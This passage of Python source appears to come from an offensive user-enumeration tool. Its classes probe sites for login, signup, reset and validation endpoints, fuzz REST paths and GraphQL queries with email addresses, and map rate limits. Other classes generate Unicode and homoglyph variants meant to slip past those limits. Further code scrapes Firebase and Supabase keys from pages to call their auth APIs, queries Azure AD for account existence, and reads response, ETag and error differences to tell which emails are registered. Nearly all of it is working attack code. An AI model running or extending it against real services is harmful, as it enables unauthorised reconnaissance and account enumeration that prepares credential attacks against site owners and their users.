            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return {"header": header, "payload": payload, "raw": token[:50] + "..."}
        except Exception:
            return None

    @staticmethod
    def compare_claims(jwt1: dict, jwt2: dict) -> list[str]:
        diffs = []
        p1, p2 = jwt1.get("payload", {}), jwt2.get("payload", {})
        keys1, keys2 = set(p1.keys()), set(p2.keys())
        if keys1 != keys2:
            diffs.append(f"different claims: +{keys2 - keys1} -{keys1 - keys2}")
        for key in keys1 & keys2:
            if p1[key] != p2[key]:
                diffs.append(f"claim '{key}' differs: {p1[key]} vs {p2[key]}")
        return diffs


class CertIntelligence:
    def __init__(self, hostname: str):
        self.hostname = hostname
        self.san_domains: list[str] = []
        self.issuer: str = ""
        self.subject: str = ""
        self.not_after: str = ""
        self.serial: str = ""

    def gather(self) -> dict:
        try:
            ctx = ssl.create_default_context()
            conn = ctx.wrap_socket(socket.socket(), server_hostname=self.hostname)
            conn.settimeout(10)
            conn.connect((self.hostname, 443))
            cert = conn.getpeercert()
            conn.close()
            if cert:
                self.issuer = str(cert.get("issuer", ""))
                self.subject = str(cert.get("subject", ""))
                self.not_after = str(cert.get("notAfter", ""))
                self.serial = str(cert.get("serialNumber", ""))
                san = cert.get("subjectAltName", ())
                for typ, val in san:
                    if typ == "DNS":
                        self.san_domains.append(val)
        except Exception:
            pass
        return {
            "san_domains": self.san_domains, "issuer": self.issuer,
            "not_after": self.not_after, "serial": self.serial,
        }


class ResponseEntropyAnalyzer:
    @staticmethod
    def shannon_entropy(data: str) -> float:
        if not data:
            return 0.0
        freq = Counter(data)
        length = len(data)
        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy

    @staticmethod
    def compare(resp1_text: str, resp2_text: str) -> dict:
        e1 = ResponseEntropyAnalyzer.shannon_entropy(resp1_text)
        e2 = ResponseEntropyAnalyzer.shannon_entropy(resp2_text)
        return {
            "entropy_1": round(e1, 4), "entropy_2": round(e2, 4),
            "diff": round(abs(e1 - e2), 4),
            "significant": abs(e1 - e2) > 0.3,
        }


class RateLimitMapper:
    def __init__(self, request_fn):
        self._request = request_fn

    def map_endpoint(self, ep: EndpointInfo, target: str) -> dict:
        probe_email = f"ratelimit_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        results = {"endpoint": ep.url, "limit": None, "window": None, "headers": {}}
        count = 0
        start = time.time()
        last_rl_headers = {}
        for i in range(100):
            data = {ep.email_param: probe_email}
            if ep.content_type == "application/json":
                resp = self._request("POST", ep.url, json=data, timeout=8)
            else:
                resp = self._request("POST", ep.url, data=data, timeout=8)
            if resp is None:
                break
            count += 1
            for h in ["X-RateLimit-Limit", "X-RateLimit-Remaining", "X-RateLimit-Reset",
                       "RateLimit-Limit", "RateLimit-Remaining", "RateLimit-Reset",
                       "Retry-After", "X-Rate-Limit-Limit", "X-Rate-Limit-Remaining"]:
                val = resp.headers.get(h)
                if val:
                    last_rl_headers[h] = val
            if resp.status_code == 429:
                elapsed = time.time() - start
                results["limit"] = count
                results["window"] = round(elapsed, 1)
                results["headers"] = last_rl_headers
                retry_after = resp.headers.get("Retry-After")
                if retry_after:
                    results["retry_after"] = retry_after
                break
        else:
            results["limit"] = ">100"
            results["window"] = round(time.time() - start, 1)
            results["headers"] = last_rl_headers
        return results


class UnicodeBypassEngine:
    NORMALIZATIONS = {
        "nfkc": lambda s: __import__("unicodedata").normalize("NFKC", s),
        "nfc": lambda s: __import__("unicodedata").normalize("NFC", s),
        "nfkd": lambda s: __import__("unicodedata").normalize("NFKD", s),
        "nfd": lambda s: __import__("unicodedata").normalize("NFD", s),
    }

    HOMOGLYPHS = {
        "a": ["а", "à", "á", "â"],
        "e": ["е", "è", "é", "ê"],
        "i": ["і", "ì", "í"],
        "o": ["о", "ò", "ó", "ô"],
        "c": ["с", "ç"],
        "p": ["р"],
        "s": ["ѕ"],
        "x": ["х"],
        "y": ["у"],
    }

    ENCODING_TRICKS = [
        ("null_byte", lambda e: e + "\x00"),
        ("tab_inject", lambda e: e + "\t"),
        ("newline", lambda e: e + "\n"),
        ("space_suffix", lambda e: e + " "),
        ("space_prefix", lambda e: " " + e),
        ("zero_width", lambda e: e[:3] + "​" + e[3:]),
        ("zero_width_joiner", lambda e: e[:3] + "‍" + e[3:]),
        ("bom", lambda e: "﻿" + e),
        ("soft_hyphen", lambda e: e[:3] + "­" + e[3:]),
        ("rtl_override", lambda e: "‮" + e),
        ("url_encoded_at", lambda e: e.replace("@", "%40")),
        ("double_url_at", lambda e: e.replace("@", "%2540")),
        ("html_entity_at", lambda e: e.replace("@", "&#64;")),
        ("fullwidth_at", lambda e: e.replace("@", "＠")),
        ("uppercase", lambda e: e.upper()),
    ]

    @staticmethod
    def generate_variants(email: str) -> list[tuple[str, str]]:
        variants = []
        for name, fn in UnicodeBypassEngine.ENCODING_TRICKS:
            try:
                variants.append((name, fn(email)))
            except Exception:
                pass
        local, domain = email.split("@") if "@" in email else (email, "")
        for char, replacements in UnicodeBypassEngine.HOMOGLYPHS.items():
            if char in local:
                for rep in replacements[:1]:
                    mutated = local.replace(char, rep, 1)
                    variants.append((f"homoglyph_{char}", f"{mutated}@{domain}"))
        for norm_name, norm_fn in UnicodeBypassEngine.NORMALIZATIONS.items():
            try:
                normalized = norm_fn(email)
                if normalized != email:
                    variants.append((f"normalize_{norm_name}", normalized))
            except Exception:
                pass
        return variants


class WebSocketProber:
    def __init__(self, target: str, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.ws_endpoints: list[str] = []

    def probe(self) -> list[str]:
        parsed = urllib.parse.urlparse(self.target)
        host = parsed.hostname or ""
        port = parsed.port or 443
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        ws_paths = [
            "/ws", "/websocket", "/socket", "/socket.io/",
            "/ws/auth", "/ws/login", "/ws/api",
            "/api/ws", "/api/websocket",
            "/realtime", "/live", "/stream",
            "/cable", "/hub", "/signalr",
        ]
        for path in ws_paths:
            try:
                if parsed.scheme == "https":
                    ctx = ssl.create_default_context()
                    sock = ctx.wrap_socket(
                        socket.create_connection((host, port), timeout=5),
                        server_hostname=host
                    )
                else:
                    sock = socket.create_connection((host, port or 80), timeout=5)
                upgrade_req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"\r\n"
                ).encode()
                sock.sendall(upgrade_req)
                resp_data = sock.recv(4096).decode(errors="ignore")
                sock.close()
                if "101" in resp_data or "upgrade" in resp_data.lower():
                    ws_url = f"{ws_scheme}://{host}{path}"
                    self.ws_endpoints.append(ws_url)
            except Exception:
                pass
        return self.ws_endpoints


class PathParamFuzzer:
    REST_PATTERNS = [
        "/api/users/{email}",
        "/api/v1/users/{email}",
        "/api/v2/users/{email}",
        "/api/user/{email}",
        "/api/v1/user/{email}",
        "/api/accounts/{email}",
        "/api/v1/accounts/{email}",
        "/api/profile/{email}",
        "/api/v1/profile/{email}",
        "/users/{email}",
        "/user/{email}",
        "/accounts/{email}",
        "/profile/{email}",
        "/api/members/{email}",
        "/api/v1/members/{email}",
        "/api/customers/{email}",
        "/api/v1/customers/{email}",
        "/api/users/{email}/exists",
        "/api/v1/users/{email}/exists",
        "/api/users/{email}/status",
        "/api/v1/users/{email}/status",
        "/api/users/lookup/{email}",
        "/api/v1/users/lookup/{email}",
        "/api/users/search/{email}",
        "/api/v1/users/find/{email}",
        "/api/users/{email}/profile",
        "/api/v1/check/{email}",
        "/api/check/{email}",
        "/check/{email}",
        "/exists/{email}",
        "/api/exists/{email}",
    ]

    def __init__(self, request_fn, target: str, subdomains: list[str]):
        self._request = request_fn
        self.target = target
        self.subdomains = subdomains
        self.found: list[EndpointInfo] = []

    def fuzz(self) -> list[EndpointInfo]:
        probe_email = f"pathfuzz_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        bases = [self.target] + self.subdomains[:3]
        for base in bases:
            for pattern in self.REST_PATTERNS:
                url = f"{base}{pattern.replace('{email}', urllib.parse.quote(probe_email))}"
                resp = self._request("GET", url, timeout=8)
                if resp and resp.status_code not in (404, 410, 502, 503, 504, 405):
                    body = resp.text.lower() if resp.text else ""
                    if "not found" not in body and "404" not in body:
                        template_url = f"{base}{pattern}"
                        self.found.append(EndpointInfo(
                            url=template_url, method="GET",
                            vector=Vector.DIRECT_CHECK,
                            email_param="{email}",
                            content_type=resp.headers.get("Content-Type", ""),
                            status_code=resp.status_code,
                        ))
        return self.found


class GraphQLBatchEngine:
    def __init__(self, request_fn):
        self._request = request_fn

    def batch_check(self, ep_url: str, emails: list[str], headers: dict) -> list[dict]:
        results = []
        batch_size = 10
        mutations = {
            "checkEmail": 'mutation {{ checkEmail{idx}:checkEmail(email: "{email}") {{ exists available }} }}',
            "userByEmail": '{{ user{idx}:userByEmail(email: "{email}") {{ id }} }}',
            "validateEmail": 'mutation {{ validate{idx}:validateEmail(email: "{email}") {{ valid exists }} }}',
        }
        for i in range(0, len(emails), batch_size):
            batch = emails[i:i+batch_size]
            for mut_name, template in mutations.items():
                parts = []
                for idx, email in enumerate(batch):
                    parts.append(template.replace("{idx}", str(idx)).replace("{email}", email))
                if len(parts) > 1:
                    combined = " ".join(parts)
                    payload = {"query": combined}
                else:
                    payload = {"query": parts[0]}
                resp = self._request("POST", ep_url, json=payload, headers=headers)
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        resp_data = data.get("data", {})
                        if resp_data and not data.get("errors"):
                            for idx, email in enumerate(batch):
                                key = f"checkEmail{idx}" if "checkEmail" in mut_name else f"user{idx}" if "user" in mut_name else f"validate{idx}"
                                val = resp_data.get(key)
                                if val is not None:
                                    results.append({"email": email, "data": val, "mutation": mut_name})
                            break
                    except Exception:
                        pass
        return results


class HTTPMethodOverride:
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override", "X-HTTP-Method",
        "X-Method-Override", "X-Override-Method",
        "_method",
    ]

    @staticmethod
    def try_overrides(request_fn, url: str, target_method: str = "POST",
                      headers: dict = None) -> Optional[requests.Response]:
        h = dict(headers or {})
        for override_header in HTTPMethodOverride.OVERRIDE_HEADERS:
            h[override_header] = target_method
            resp = request_fn("GET", url, headers=h)
            if resp and resp.status_code not in (404, 405, 501):
                return resp
            del h[override_header]
        for method_param in ["_method", "method", "__method"]:
            resp = request_fn("POST", url, data={method_param: "GET"}, headers=headers)
            if resp and resp.status_code not in (404, 405, 501):
                return resp
        return None


class BehavioralCluster:
    @staticmethod
    def cluster_responses(results: list) -> dict:
        if len(results) < 3:
            return {"clusters": 0, "analysis": "insufficient data"}
        status_groups: dict[int, list] = defaultdict(list)
        length_groups: dict[str, list] = defaultdict(list)
        for r in results:
            status_groups[r.status_code].append(r)
            bucket = str(len(r.raw_body_hash or "") // 100 * 100)
            length_groups[bucket].append(r)
        existing_cluster = []
        not_found_cluster = []
        for r in results:
            if r.exists is True:
                existing_cluster.append(r)
            elif r.exists is False:
                not_found_cluster.append(r)
        analysis = {
            "clusters": len(status_groups),
            "status_distribution": {k: len(v) for k, v in status_groups.items()},
            "existing_count": len(existing_cluster),
            "not_found_count": len(not_found_cluster),
            "unique_statuses": list(status_groups.keys()),
        }
        if len(existing_cluster) > 0 and len(not_found_cluster) > 0:
            exist_statuses = Counter(r.status_code for r in existing_cluster)
            nf_statuses = Counter(r.status_code for r in not_found_cluster)
            if exist_statuses.most_common(1)[0][0] != nf_statuses.most_common(1)[0][0]:
                analysis["clean_split"] = True
                analysis["exist_status"] = exist_statuses.most_common(1)[0][0]
                analysis["not_found_status"] = nf_statuses.most_common(1)[0][0]
        return analysis


# ================================================================
#  v3.5 — DEEPEST LEVEL CLASSES
# ================================================================


class SourceMapMiner:
    COMMON_BUNDLES = [
        "/static/js/main.js", "/static/js/app.js", "/static/js/bundle.js",
        "/assets/js/app.js", "/dist/app.js", "/build/static/js/main.js",
        "/_next/static/chunks/main.js", "/_next/static/chunks/pages/_app.js",
        "/js/app.js", "/js/main.js", "/js/bundle.js", "/js/vendor.js",
        "/assets/application.js", "/packs/js/application.js",
        "/static/js/vendor.js", "/static/js/runtime.js",
    ]

    AUTH_PATTERNS = re.compile(
        r"""(?:['"])((?:/api)?/(?:v[0-9]+/)?"""
        r"""(?:auth|login|signin|signup|register|forgot|reset|password|"""
        r"""verify|check|validate|user|account|session|token|otp|"""
        r"""invitation|onboard|recover|2fa|mfa|sso|oauth|identity|"""
        r"""email[_-]?(?:check|verify|validate|exists|available|lookup))"""
        r"""[^'"]{0,60})(?:['"])""",
        re.IGNORECASE,
    )

    def __init__(self, request_fn, target: str, verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.found_routes: list[str] = []

    def mine(self) -> list[str]:
        script_urls = self._find_scripts()
        for url in script_urls[:30]:
            self._try_source_map(url)
            self._extract_from_js(url)
        return list(dict.fromkeys(self.found_routes))

    def _find_scripts(self) -> list[str]:
        urls: list[str] = []
        resp = self._request("GET", self.target)
        if resp and resp.text:
            srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', resp.text)
            for s in srcs:
                full = s if s.startswith("http") else urllib.parse.urljoin(self.target, s)
                urls.append(full)
        for bundle in self.COMMON_BUNDLES:
            urls.append(f"{self.target}{bundle}")
        return list(dict.fromkeys(urls))

    def _try_source_map(self, js_url: str):
        map_url = js_url + ".map"
        resp = self._request("GET", map_url, retries=0, timeout=5)
        if resp and resp.status_code == 200 and resp.text.startswith("{"):
            try:
                data = resp.json()
                sources = data.get("sources", [])
                for src in sources:
                    if any(kw in src.lower() for kw in ("api", "auth", "login", "user", "account")):
                        if self.verbose:
                            print(f"    [SRCMAP] source file: {src}")
                content = data.get("sourcesContent", [])
                for block in content:
                    if block:
                        matches = self.AUTH_PATTERNS.findall(block)
                        self.found_routes.extend(matches)
            except Exception:
                pass

    def _extract_from_js(self, js_url: str):
        resp = self._request("GET", js_url, retries=0, timeout=5)
        if resp and resp.status_code == 200 and len(resp.text) < 5_000_000:
            matches = self.AUTH_PATTERNS.findall(resp.text)
            self.found_routes.extend(matches)


class BaaSDetector:
    FIREBASE_ENDPOINTS = [
        ("identitytoolkit.googleapis.com/v1/accounts:lookup", "POST"),
        ("identitytoolkit.googleapis.com/v1/accounts:signInWithPassword", "POST"),
        ("identitytoolkit.googleapis.com/v1/accounts:createAuthUri", "POST"),
        ("identitytoolkit.googleapis.com/v1/accounts:sendOobCode", "POST"),
        ("identitytoolkit.googleapis.com/v1/accounts:signUp", "POST"),
    ]
    SUPABASE_PATTERNS = [
        "/auth/v1/signup", "/auth/v1/token?grant_type=password",
        "/auth/v1/recover", "/auth/v1/magiclink",
        "/auth/v1/otp", "/auth/v1/user",
    ]
    COGNITO_INDICATORS = [
        "cognito-idp.", ".amazonaws.com", "AWSCognitoIdentityProviderService",
    ]
    AUTH0_PATTERNS = [
        "/dbconnections/signup", "/dbconnections/change_password",
        "/co/authenticate", "/passwordless/start",
        "/oauth/token", "/userinfo",
    ]
    OKTA_PATTERNS = [
        "/api/v1/authn", "/api/v1/sessions", "/api/v1/users",
        "/.well-known/openid-configuration",
        "/oauth2/default/v1/token", "/oauth2/v1/authorize",
    ]

    def __init__(self, request_fn, target: str, verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.detected: dict[str, list[str]] = {}

    def detect(self) -> dict[str, list[str]]:
        resp = self._request("GET", self.target, retries=0)
        body = resp.text if resp else ""

        if "firebaseapp.com" in body or "firebase" in body.lower() or "__firebase" in body:
            self._probe_firebase(body)
        if "supabase" in body.lower() or ".supabase.co" in body:
            self._probe_supabase(body)
        for ind in self.COGNITO_INDICATORS:
            if ind.lower() in body.lower():
                self._probe_cognito(body)
                break
        if "auth0" in body.lower() or ".auth0.com" in body:
            self._probe_auth0(body)
        for pat in self.OKTA_PATTERNS[:2]:
            r = self._request("POST", f"{self.target}{pat}", retries=0, timeout=5,
                              json={"username": "probe@test.invalid", "password": "x"})
            if r and r.status_code not in (404, 502, 503):
                self.detected.setdefault("okta", []).append(pat)
                break

        return self.detected

    def _probe_firebase(self, body: str):
        api_key = ""
        m = re.search(r'apiKey["\s:]+["\']([A-Za-z0-9_-]{20,})["\']', body)
        if m:
            api_key = m.group(1)
        if api_key:
            url = f"https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key={api_key}"
            r = self._request("POST", url, retries=0, timeout=5,
                              json={"identifier": "probe@test.invalid", "continueUri": self.target})
            if r and r.status_code == 200:
                self.detected["firebase"] = [f"createAuthUri (key={api_key[:8]}...)"]
                if self.verbose:
                    print(f"    [BAAS] Firebase auth API accessible with key {api_key[:12]}...")

    def _probe_supabase(self, body: str):
        m = re.search(r'(https://[a-z0-9]+\.supabase\.co)', body)
        if not m:
            return
        base = m.group(1)
        anon_key = ""
        km = re.search(r'(?:anon|public)["\s:]+["\']?(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', body)
        if km:
            anon_key = km.group(1)
        for pat in self.SUPABASE_PATTERNS:
            url = f"{base}{pat}"
            headers = {}
            if anon_key:
                headers["apikey"] = anon_key
                headers["Authorization"] = f"Bearer {anon_key}"
            r = self._request("POST", url, retries=0, timeout=5, headers=headers,
                              json={"email": "probe@test.invalid", "password": "Pr0beTest!23"})
            if r and r.status_code not in (404, 502, 503):
                self.detected.setdefault("supabase", []).append(pat)

    def _probe_cognito(self, body: str):
        m = re.search(r'(us-east-1|us-west-2|eu-west-1|ap-southeast-1)[_\s]*["\']?\s*[:=]\s*["\']?([A-Za-z0-9_]+)', body)
        if m:
            self.detected["cognito"] = [f"region={m.group(1)}"]
        else:
            self.detected["cognito"] = ["indicators found"]

    def _probe_auth0(self, body: str):
        m = re.search(r'(https?://[a-z0-9-]+\.(?:auth0\.com|us\.auth0\.com|eu\.auth0\.com))', body, re.I)
        if not m:
            return
        base = m.group(1)
        for pat in self.AUTH0_PATTERNS:
            url = f"{base}{pat}"
            r = self._request("POST", url, retries=0, timeout=5,
                              json={"email": "probe@test.invalid", "password": "x", "connection": "Username-Password-Authentication"})
            if r and r.status_code not in (404, 502, 503):
                self.detected.setdefault("auth0", []).append(pat)


class SSOProviderProber:
    PROVIDERS = {
        "okta": ["/api/v1/authn", "/api/v1/sessions/me", "/.well-known/openid-configuration",
                 "/login/login.htm", "/app/UserHome"],
        "onelogin": ["/oidc/2/auth", "/api/2/saml_assertion", "/session_via_api_token",
                     "/trust/saml2/http-post/sso"],
        "azure_ad": ["/common/oauth2/v2.0/token", "/common/oauth2/v2.0/authorize",
                     "/.well-known/openid-configuration",
                     "/common/GetCredentialType"],
        "ping": ["/as/authorization.oauth2", "/pf/heartbeat.ping",
                 "/sp/startSSO.ping", "/idp/startSSO.ping"],
        "keycloak": ["/auth/realms/master/.well-known/openid-configuration",
                     "/auth/realms/master/protocol/openid-connect/token",
                     "/auth/admin/realms"],
    }
    AZURE_AD_ENUM_URL = "https://login.microsoftonline.com/common/GetCredentialType"

    def __init__(self, request_fn, target: str, verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.detected_providers: dict[str, list[str]] = {}

    def probe(self) -> dict[str, list[str]]:
        for provider, paths in self.PROVIDERS.items():
            for path in paths:
                url = f"{self.target}{path}"
                r = self._request("GET", url, retries=0, timeout=5)
                if r and r.status_code not in (404, 502, 503, 504):
                    self.detected_providers.setdefault(provider, []).append(path)
                    break
        return self.detected_providers

    def check_azure_ad(self, email: str) -> Optional[dict]:
        payload = {"username": email, "isOtherIdpSupported": True,
                   "checkPhones": False, "isRemoteNGCSupported": True,
                   "isCookieBannerShown": False, "isFidoSupported": True,
                   "flowToken": "", "isSignup": False}
        r = self._request("POST", self.AZURE_AD_ENUM_URL, retries=0, timeout=5, json=payload)
        if r and r.status_code == 200:
            try:
                data = r.json()
                throttle = data.get("ThrottleStatus", 0)
                if_exists = data.get("IfExistsResult", -1)
                has_password = data.get("Credentials", {}).get("HasPassword", None)
                is_federated = data.get("EstsProperties", {}).get("UserTenantBranding") is not None
                return {"if_exists": if_exists, "has_password": has_password,
                        "federated": is_federated, "throttled": throttle != 0}
            except Exception:
                pass
        return None


class XMLRPCProber:
    WP_XMLRPC_PATH = "/xmlrpc.php"
    JOOMLA_PATHS = ["/administrator/index.php", "/api/index.php/v1/users"]
    DRUPAL_PATHS = ["/user/login", "/jsonapi/user/user"]

    def __init__(self, request_fn, target: str, verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.verbose = verbose

    def probe_wordpress(self) -> list[EndpointInfo]:
        endpoints = []
        url = f"{self.target}{self.WP_XMLRPC_PATH}"
        payload = """<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>probe@test.invalid</value></param>
<param><value>wrongpassword</value></param></params></methodCall>"""
        r = self._request("POST", url, retries=0, timeout=5, data=payload,
                          headers={"Content-Type": "text/xml"})
        if r and r.status_code == 200 and "methodResponse" in (r.text or ""):
            endpoints.append(EndpointInfo(
                url=url, method="POST", vector=Vector.LOGIN,
                email_param="xml_body", content_type="text/xml",
                status_code=r.status_code,
            ))
        wp_login = f"{self.target}/wp-login.php?action=lostpassword"
        r2 = self._request("POST", wp_login, retries=0, timeout=5,
                           data={"user_login": "probe@test.invalid"})
        if r2 and r2.status_code not in (404, 502, 503):
            endpoints.append(EndpointInfo(
                url=wp_login, method="POST", vector=Vector.PASSWORD_RESET,
                email_param="user_login", content_type="application/x-www-form-urlencoded",
                status_code=r2.status_code,
            ))
        wp_json_users = f"{self.target}/wp-json/wp/v2/users"
        r3 = self._request("GET", wp_json_users, retries=0, timeout=5)
        if r3 and r3.status_code == 200:
            try:
                users = r3.json()
                if isinstance(users, list) and len(users) > 0:
                    endpoints.append(EndpointInfo(
                        url=wp_json_users, method="GET", vector=Vector.API_USER,
                        status_code=200,
                    ))
            except Exception:
                pass
        return endpoints

    def probe_legacy(self) -> list[EndpointInfo]:
        endpoints = []
        for path in self.JOOMLA_PATHS + self.DRUPAL_PATHS:
            url = f"{self.target}{path}"
            r = self._request("GET", url, retries=0, timeout=5)
            if r and r.status_code not in (404, 502, 503, 504):
                vec = Vector.LOGIN if "login" in path else Vector.API_USER
                endpoints.append(EndpointInfo(
                    url=url, method="GET" if "api" in path or "json" in path else "POST",
                    vector=vec, status_code=r.status_code,
                ))
        return endpoints


class PrevalidationDiscovery:
    PATTERNS = [
        "/api/validate/email", "/api/v1/validate/email", "/api/v2/validate/email",
        "/api/check/email", "/api/v1/check/email",
        "/api/validate/field", "/api/v1/validate/field",
        "/api/registration/validate", "/api/v1/registration/validate",
        "/api/signup/validate", "/api/v1/signup/validate",
        "/api/form/validate", "/api/v1/form/validate",
        "/api/validate", "/api/v1/validate",
        "/api/email/validate", "/api/v1/email/validate",
        "/api/pre-check", "/api/v1/pre-check",
        "/api/eligibility", "/api/v1/eligibility",
        "/api/availability/email", "/api/v1/availability/email",
        "/api/can-register", "/api/v1/can-register",
    ]
    FIELD_NAMES = ["email", "value", "field_value", "identifier", "input", "data"]

    def __init__(self, request_fn, target: str, subdomains: list[str], verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.subdomains = subdomains
        self.verbose = verbose

    def discover(self) -> list[EndpointInfo]:
        found = []
        targets = [self.target] + self.subdomains[:3]
        probe_email = f"preval_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"

        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = {}
            for base in targets:
                for path in self.PATTERNS:
                    url = f"{base}{path}"
                    for field in self.FIELD_NAMES[:3]:
                        futures[pool.submit(
                            self._probe, url, field, probe_email
                        )] = (url, field)
            for future in as_completed(futures):
                ep = future.result()
                if ep:
                    found.append(ep)
        return found

    def _probe(self, url: str, field: str, email: str) -> Optional[EndpointInfo]:
        for payload in [
            {"json": {field: email}},
            {"json": {field: email, "field_name": "email"}},
            {"data": {field: email}},
        ]:
            r = self._request("POST", url, retries=0, timeout=5, **payload)
            if r and r.status_code not in (404, 405, 502, 503, 504):
                body = r.text.lower() if r.text else ""
                if any(s in body for s in ("valid", "available", "taken", "exists",
                                           "registered", "not found", "invalid")):
                    ct = "application/json" if "json" in payload else "application/x-www-form-urlencoded"
                    return EndpointInfo(
                        url=url, method="POST", vector=Vector.DIRECT_CHECK,
                        email_param=field, content_type=ct,
                        status_code=r.status_code,
                    )
        return None


class MultiTenantLookup:
    WORKSPACE_PATTERNS = [
        "/api/workspace/lookup", "/api/v1/workspace/lookup",
        "/api/team/lookup", "/api/v1/team/lookup",
        "/api/org/lookup", "/api/v1/org/lookup",
        "/api/organization/lookup", "/api/v1/organization/lookup",
        "/api/tenant/check", "/api/v1/tenant/check",
        "/api/domain/check", "/api/v1/domain/check",
        "/api/workspace/check", "/api/v1/workspace/check",
        "/api/company/lookup", "/api/v1/company/lookup",
        "/api/saml/discovery", "/api/v1/saml/discovery",
        "/api/sso/discover", "/api/v1/sso/discover",
        "/api/enterprise/lookup", "/api/v1/enterprise/lookup",
    ]

    def __init__(self, request_fn, target: str, verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.verbose = verbose

    def lookup(self, emails: list[str]) -> list[dict]:
        findings = []
        domains = list(set(e.split("@")[-1] for e in emails if "@" in e))

        for path in self.WORKSPACE_PATTERNS:
            url = f"{self.target}{path}"
            for domain in domains[:5]:
                for payload in [
                    {"json": {"domain": domain}},
                    {"json": {"email": f"probe@{domain}"}},
                    {"json": {"workspace": domain.split(".")[0]}},
                ]:
                    r = self._request("POST", url, retries=0, timeout=5, **payload)
                    if r and r.status_code == 200:
                        try:
                            data = r.json()
                            if isinstance(data, dict) and len(data) > 1:
                                findings.append({
                                    "url": url, "domain": domain,
                                    "response": data,
                                })
                                if self.verbose:
                                    print(f"    [TENANT] {url} -> {domain}: {list(data.keys())[:5]}")
                        except Exception:
                            pass
                    if r and r.status_code not in (404, 405, 502, 503):
                        break
        return findings


class DoubleSubmitDetector:
    def __init__(self, request_fn, verbose: bool = False):
        self._request = request_fn
        self.verbose = verbose

    def check(self, endpoint: EndpointInfo, email: str, send_fn) -> Optional[dict]:
        resp1, elapsed1 = send_fn(endpoint, email)
        if resp1 is None:
            return None
        time.sleep(0.3)
        resp2, elapsed2 = send_fn(endpoint, email)
        if resp2 is None:
            return None

        diff = {
            "status_diff": resp1.status_code != resp2.status_code,
            "length_diff": abs(len(resp1.text) - len(resp2.text)),
            "body_identical": resp1.text == resp2.text,
        }
        body2 = resp2.text.lower()
        SECOND_SUBMIT_SIGNALS = [
            "already registered", "already exists", "duplicate",
            "account exists", "email in use", "email taken",
            "previously registered", "already in use",
            "email already", "user exists", "already have an account",
        ]
        for sig in SECOND_SUBMIT_SIGNALS:
            if sig in body2:
                diff["signal"] = sig
                diff["exists"] = True
                return diff

        if diff["status_diff"] or diff["length_diff"] > 50:
            diff["suspicious"] = True
            return diff
        return None


class ETagDifferential:
    def __init__(self, request_fn, verbose: bool = False):
        self._request = request_fn
        self.verbose = verbose

    def compare(self, endpoint: EndpointInfo, baseline_email: str,
                target_email: str, send_fn) -> Optional[dict]:
        resp1, _ = send_fn(endpoint, baseline_email)
        if resp1 is None:
            return None
        resp2, _ = send_fn(endpoint, target_email)
        if resp2 is None:
            return None

        etag1 = resp1.headers.get("ETag", "")
        etag2 = resp2.headers.get("ETag", "")
        lm1 = resp1.headers.get("Last-Modified", "")
        lm2 = resp2.headers.get("Last-Modified", "")
        cc1 = resp1.headers.get("Cache-Control", "")
        cc2 = resp2.headers.get("Cache-Control", "")
        vary1 = resp1.headers.get("Vary", "")
        vary2 = resp2.headers.get("Vary", "")

        diffs = {}
        if etag1 and etag2 and etag1 != etag2:
            diffs["etag"] = {"baseline": etag1, "target": etag2}
        if lm1 and lm2 and lm1 != lm2:
            diffs["last_modified"] = {"baseline": lm1, "target": lm2}
        if cc1 != cc2:
            diffs["cache_control"] = {"baseline": cc1, "target": cc2}
        if vary1 != vary2:
            diffs["vary"] = {"baseline": vary1, "target": vary2}

        return diffs if diffs else None


class ErrorClassifier:
    ERROR_CATEGORIES = {
        "invalid_credentials": ["invalid credentials", "wrong password", "incorrect password",
                                "bad credentials", "authentication failed", "invalid password"],
        "user_not_found": ["user not found", "account not found", "no account",
                           "doesn't exist", "does not exist", "not registered",
                           "no user", "unknown user", "invalid user",
                           "email not found", "no such user", "couldn't find"],
        "user_exists": ["already exists", "already registered", "email taken",
                        "account exists", "duplicate", "email in use", "already in use"],
        "rate_limited": ["too many", "rate limit", "slow down", "try again later",
                         "throttle", "exceeded"],
        "locked": ["locked", "suspended", "disabled", "blocked", "banned"],
        "validation": ["invalid email", "valid email", "format", "malformed"],
        "generic": ["error", "failed", "something went wrong", "internal error"],
    }

    @staticmethod
    def classify(response_body: str) -> list[str]:
        body = response_body.lower()
        categories = []
        for category, signals in ErrorClassifier.ERROR_CATEGORIES.items():
            for sig in signals:
                if sig in body:
                    categories.append(category)
                    break
        return categories

    @staticmethod
    def differential(baseline_body: str, target_body: str) -> dict:
        base_cats = ErrorClassifier.classify(baseline_body)
        target_cats = ErrorClassifier.classify(target_body)
        return {
            "baseline_categories": base_cats,
            "target_categories": target_cats,
            "diff": list(set(target_cats) - set(base_cats)),
            "significant": base_cats != target_cats,
            "enum_signal": (
                "user_not_found" in base_cats and "user_not_found" not in target_cats
            ) or (
                "invalid_credentials" in target_cats and "user_not_found" in base_cats
            ) or (
                "user_exists" in target_cats
            ),
        }


class ResetTokenAnalyzer:
